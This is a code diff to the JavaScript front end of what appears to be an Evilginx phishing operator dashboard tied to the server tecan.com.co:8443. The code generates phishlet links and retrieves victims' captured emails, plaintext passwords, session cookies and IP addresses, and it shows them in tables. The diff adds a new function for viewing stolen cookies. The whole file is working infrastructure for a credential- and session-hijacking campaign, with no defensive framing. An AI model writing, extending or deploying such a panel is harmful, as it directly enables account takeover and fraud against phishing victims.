@@ -1,7 +1,7 @@
 console.log("✅ script.js loaded successfully");
 
-// Set Evilginx API server URL
-const EVILGINX_SERVER = "https://tecan.com.co";
+// Set Evilginx API server URL (include port 8443 because Nginx is listening on that port)
+const EVILGINX_SERVER = "https://tecan.com.co:8443";
 
 // Wait for Firebase to load before executing functions
 document.addEventListener("DOMContentLoaded", function () {
@@ -37,12 +37,10 @@ function checkAuthStatus() {
 function login() {
   const email = document.getElementById("email").value;
   const password = document.getElementById("password").value;
-
   if (!email || !password) {
     alert("Please enter email and password.");
     return;
   }
-
   firebase.auth().signInWithEmailAndPassword(email, password)
     .then((userCredential) => {
       console.log("✅ Login successful:", userCredential.user.email);
@@ -71,7 +69,7 @@ function generatePhishletLink(phishlet) {
   console.log(`🔄 Generating link for phishlet: ${phishlet}`);
   fetch(`${EVILGINX_SERVER}/generate_link?phishlet=${encodeURIComponent(phishlet)}`, {
     method: "GET",
-    credentials: "include", // Allow cookies if needed
+    credentials: "include",
     headers: {
       "Content-Type": "application/json"
     }
@@ -98,87 +96,113 @@ function generatePhishletLink(phishlet) {
 }
 
 // Fetch generated links history and update the table with id "generatedLinks"
-function viewGeneratedLinks() {
+async function viewGeneratedLinks() {
   console.log("🔄 Fetching generated links history...");
-  fetch(`${EVILGINX_SERVER}/generated_links_history`, {
-    method: "GET",
-    headers: {
-      "Content-Type": "application/json"
-    }
-  })
-    .then(response => {
-      if (!response.ok) {
-        throw new Error(`HTTP error! Status: ${response.status}`);
+  try {
+    const response = await fetch(`${EVILGINX_SERVER}/generated_links_history`, {
+      method: "GET",
+      headers: {
+        "Content-Type": "application/json"
       }
-      return response.json();
-    })
-    .then(data => {
-      let tableBody = document.getElementById("generatedLinks");
-      if (!tableBody) {
-        console.error("Element with id 'generatedLinks' not found.");
-        return;
-      }
-      tableBody.innerHTML = "";
-      if (data.length === 0) {
-        tableBody.innerHTML = "<tr><td colspan='4'>No generated links found.</td></tr>";
-      } else {
-        data.forEach(record => {
-          tableBody.innerHTML += `<tr>
-                                    <td>${record.phishlet}</td>
-                                    <td>${record.link}</td>
-                                    <td>${record.timestamp}</td>
-                                    <td>${record.ip}</td>
-                                  </tr>`;
-        });
-      }
-      console.log("✅ Generated links updated successfully.");
-    })
-    .catch(error => {
-      console.error("❌ Error fetching generated links:", error);
-      alert("Failed to load generated links: " + error.message);
     });
+    if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);
+    const data = await response.json();
+    const tableBody = document.getElementById("generatedLinks");
+    if (!tableBody) {
+      console.error("Element with id 'generatedLinks' not found.");
+      return;
+    }
+    tableBody.innerHTML = "";
+    if (data.length === 0) {
+      tableBody.innerHTML = "<tr><td colspan='4'>No generated links found.</td></tr>";
+    } else {
+      data.forEach(record => {
+        tableBody.innerHTML += `<tr>
+                                  <td>${record.phishlet}</td>
+                                  <td><a href="${record.link}" target="_blank">${record.link}</a></td>
+                                  <td>${record.timestamp}</td>
+                                  <td>${record.ip}</td>
+                                </tr>`;
+      });
+    }
+    console.log("✅ Generated links updated successfully.");
+  } catch (error) {
+    console.error("❌ Error fetching generated links:", error);
+    alert("Failed to load generated links: " + error.message);
+  }
 }
 
 // Fetch captured sessions and update the table with id "capturedSessions"
-function viewCapturedSessions() {
+async function viewCapturedSessions() {
   console.log("🔄 Fetching captured sessions...");
-  fetch(`${EVILGINX_SERVER}/captured_sessions`, {
-    method: "GET",
-    headers: {
-      "Content-Type": "application/json"
-    }
-  })
-    .then(response => {
-      if (!response.ok) {
-        throw new Error(`HTTP error! Status: ${response.status}`);
+  try {
+    const response = await fetch(`${EVILGINX_SERVER}/captured_sessions`, {
+      method: "GET",
+      headers: {
+        "Content-Type": "application/json"
       }
-      return response.json();
-    })
-    .then(data => {
-      let tableBody = document.getElementById("capturedSessions");
-      if (!tableBody) {
-        console.error("Element with id 'capturedSessions' not found.");
-        return;
-      }
-      tableBody.innerHTML = "";
-      if (data.length === 0) {
-        tableBody.innerHTML = "<tr><td colspan='5'>No captured sessions found.</td></tr>";
-      } else {
-        data.forEach(session => {
-          tableBody.innerHTML += `<tr>
-                                    <td>${session.email}</td>
-                                    <td>${session.password}</td>
-                                    <td>${session.cookies}</td>
-                                    <td>${session.ip}</td>
-                                    <td>${session.timestamp}</td>
-                                  </tr>`;
-        });
-      }
-      console.log("✅ Captured sessions updated successfully.");
-    })
-    .catch(error => {
-      console.error("❌ Error fetching captured sessions:", error);
-      alert("Failed to load captured sessions: " + error.message);
     });
+    if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);
+    const data = await response.json();
+    const tableBody = document.getElementById("capturedSessions");
+    if (!tableBody) {
+      console.error("Element with id 'capturedSessions' not found.");
+      return;
+    }
+    tableBody.innerHTML = "";
+    if (data.length === 0) {
+      tableBody.innerHTML = "<tr><td colspan='5'>No captured sessions found.</td></tr>";
+    } else {
+      data.forEach(session => {
+        tableBody.innerHTML += `<tr>
+                                  <td>${session.email}</td>
+                                  <td>${session.password}</td>
+                                  <td>${session.cookies}</td>
+                                  <td>${session.ip}</td>
+                                  <td>${session.timestamp}</td>
+                                </tr>`;
+      });
+    }
+    console.log("✅ Captured sessions updated successfully.");
+  } catch (error) {
+    console.error("❌ Error fetching captured sessions:", error);
+    alert("Failed to load captured sessions: " + error.message);
+  }
 }
 
+// Fetch captured cookies and update the table with id "cookies"
+async function viewCookies() {
+  console.log("🔄 Fetching captured cookies...");
+  try {
+    const response = await fetch(`${EVILGINX_SERVER}/cookies`, {
+      method: "GET",
+      headers: {
+        "Content-Type": "application/json"
+      }
+    });
+    if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);
+    const data = await response.json();
+    const tableBody = document.getElementById("cookies");
+    if (!tableBody) {
+      console.error("Element with id 'cookies' not found.");
+      return;
+    }
+    tableBody.innerHTML = "";
+    if (data.length === 0) {
+      tableBody.innerHTML = "<tr><td colspan='4'>No cookies captured.</td></tr>";
+    } else {
+      data.forEach(item => {
+        tableBody.innerHTML += `<tr>
+                                  <td>${item.email}</td>
+                                  <td>${item.cookies}</td>
+                                  <td>${item.timestamp}</td>
+                                  <td>${item.ip}</td>
+                                </tr>`;
+      });
+    }
+    console.log("✅ Cookies updated successfully.");
+  } catch (error) {
+    console.error("❌ Error fetching cookies:", error);
+    alert("Failed to load cookies: " + error.message);
+  }
+}
